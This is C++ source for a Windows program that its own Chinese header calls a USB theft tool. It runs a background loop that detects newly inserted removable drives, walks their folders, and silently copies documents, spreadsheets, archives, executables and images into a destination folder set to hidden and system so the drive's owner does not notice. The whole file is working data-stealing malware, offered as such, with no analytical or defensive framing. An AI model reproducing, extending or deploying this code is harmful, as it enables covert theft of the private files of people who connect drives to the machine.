/*
* Copyright (c) 2005, Outmatch@gmail.com
* All rights reserved.
*
* 文件名称：usbsteal.cpp
* 文件标识：见配置管理计划书
* 摘    要：USB盗窃程序,生成线程监视并盗窃U盘内容
*
* 当前版本：1.0
* 作    者：outmatch
* 完成日期：2006年9月6日
*
* 取代版本：无
* 原作者  ：
* 完成日期：
*/

#include "config.h"
#include <windows.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <tchar.h>
#include <fstream>
#include <time.h>
#include <process.h>
#include "folderutils.h"

using namespace std;

typedef std::vector<std::string> usbList;

extern const std::string& getConfigPath();
extern std::string getDestDirName();
extern usbList searchforUSB();
extern DWORD setDirHidden(const std::string &dir);
extern void copierThreadFunc(LPVOID *);
extern std::string getSystemPath();

HRESULT   EnumDirectory(LPCTSTR   lpszDirectory,BOOL   bIncludeSubDirectory, std::vector<std::string>& vsFiles);

char g_szCurVol[MAX_PATH+1] = { 0 };

// 间隔时间，毫秒
enum { INTERVAL = 1000 };

usbList searchforUSB()
{
	static usbList prevUsbList; 
	usbList list;
	char buf[MAX_PATH+1];
	DWORD len = GetLogicalDriveStrings(sizeof(buf), buf);

	for(CHAR *s=buf; *s; s+=strlen(s) + 1) {
		UINT uDriveType = GetDriveType(s);
		if(uDriveType == DRIVE_REMOVABLE) {
			list.push_back((s));
		}
	}

	if(prevUsbList == list) {
		list.clear();
		return list;
	}
	else {
		// 有改变,报告prevUsbList 和 list差异的部分.
		usbList newlist;

		for(usbList::iterator it = list.begin();
				it != list.end();
				++it)
		{
			bool skip = false;
			for(int i=0; i<prevUsbList.size(); i++) {
				if(*it == prevUsbList[i])
				{
					skip = true;	
					break;
				}
				else
				{
					skip = false;
				}
			}

			if(skip == false) {
				newlist.push_back(*it);
			}
		}
		prevUsbList = list;
		return newlist;
	}
}

const char* g_szFileAcceptList[] = {
	"doc",
	"xls",
	"ppt",
	"exe",
	"zip",
	"rar",
	"txt",
	"rtf",
	"pdf",
	"html",
	"htm",
	"jpg",
	"gif",
	"png",
//	"*",
	0
};

/** 检测文件是否需要复制 */
bool needCopy(const std::string &path)
{
	char szExt[MAX_PATH+1] = { 0 }; 
	_splitpath(path.c_str(), 0, 0, 0, szExt);
	for(const char** p = g_szFileAcceptList; *p != 0; p++) {
		// 如果是*，返回真
		if(stricmp(*p, "*") == 0)
			return true;
		// ".doc", 跳过点字符
		if(stricmp(*p, szExt+1) == 0)
			return true;
	}
	return false;
}

std::string getOutputFilename(const std::string& sFilename, const std::string& sSrcDir, const std::string &sDstDir)
{
	int pos = sFilename.find(sSrcDir);
	if(pos == std::string::npos)
		return sDstDir + sFilename;
	pos += sSrcDir.length();
	if(sDstDir[sDstDir.length()-1] != '\\')
		return sDstDir + "\\" + sFilename.substr(pos);
	return sDstDir + sFilename.substr(pos);
}

void copierThreadFunc(LPVOID *)
{
	// Search for USB device
	for( ;; ) {
		usbList list;
		list = searchforUSB();

		if(list.size() > 0) {
			for(int i=0; i<list.size(); i++) {
				string srcDir = list[i];
//				strcpy(g_szCurVol, srcDir.c_str());
				g_szCurVol[0] = srcDir[0];
				strcpy(&g_szCurVol[1], ":\\");
				string dstDir = getDestDirName();
				// srcDir += "*.*";
#if 0
				MessageBox(0, srcDir.c_str(), "SRC", 0);
#endif
				// 开始复制文件
				// TODO:　使用文件通配列表
				// CFolderUtils::CopyFolder(srcDir.c_str(), dstDir.c_str());
				std::vector<std::string> v;
				EnumDirectory(srcDir.c_str(), TRUE, v);
				for(std::vector<std::string>::iterator
						it = v.begin();
						it != v.end();
						++it) 
				{
					if(needCopy(*it)) {
						std::string sDstFileName = getOutputFilename(*it, srcDir, dstDir);
						// TODO: 创建文件夹
						char szDrive[3], szDir[MAX_PATH+1];
						_splitpath(sDstFileName.c_str(), szDrive, szDir, 0, 0);
						std::string sDir = szDrive;
						sDir += szDir;
						CFolderUtils::CreateFolder(sDir.c_str());
						CopyFile(it->c_str(), sDstFileName.c_str(), FALSE);
					}
				}
				
				Sleep(INTERVAL);
			}
		}

		Sleep(INTERVAL);
	}
	_endthread();
}

// 过滤不能为目录名的\/:*?"<>|字符
void filterBadChar(char *pszStr)
{
	static const char *szBadChar = "\\/:*?\"<>|"; 
	while(*pszStr!='\0') {
		for(int i=0; i<strlen(szBadChar); ++i) {
			if(*pszStr == szBadChar[i])
				*pszStr = '-';
		}

		pszStr++;
	}
}

// 生成输出目录名: 格式: 日期 - 时间 - 卷标名
std::string getOutputDirname()
{
	char     m_Volume[256];//卷标名  
	char     m_FileSysName[256];  
	DWORD   m_SerialNum;//序列号  
	DWORD   m_FileNameLength;  
	DWORD   m_FileSysFlag;  
	::GetVolumeInformation(g_szCurVol,
			m_Volume,  
			256,  
			&m_SerialNum,  
			&m_FileNameLength,  
			&m_FileSysFlag,  
			m_FileSysName,  
			256);   
	time_t ti = time(0);

	char datebuf[9];
	_strdate(datebuf);
	filterBadChar(datebuf);

	char timebuf[9];
	_strtime(timebuf);
	filterBadChar(timebuf);

	if(strcmp(m_Volume, "") == 0) {
		strcpy(m_Volume, "无卷标");
	}

	filterBadChar(m_Volume);

	char buf[1024];
	sprintf(buf, "%s %s %s", datebuf, timebuf, m_Volume);
	
	return buf;
}

std::string getDestDirName()
{
	std::string dir;

	ifstream f(getConfigPath().c_str());
	f >> dir;
	dir += "\\";

	CFolderUtils::CreateFolder(dir.c_str());
	setDirHidden(dir);

	std::string str = getOutputDirname();
	dir += str;
	CFolderUtils::CreateFolder(dir.c_str());

	return dir;
}

DWORD setDirHidden(const std::string &dir)
{
	DWORD stat = GetFileAttributes( dir.c_str());
	stat |= FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
	DWORD ret = SetFileAttributes( dir.c_str(), stat );

	return ret;
}

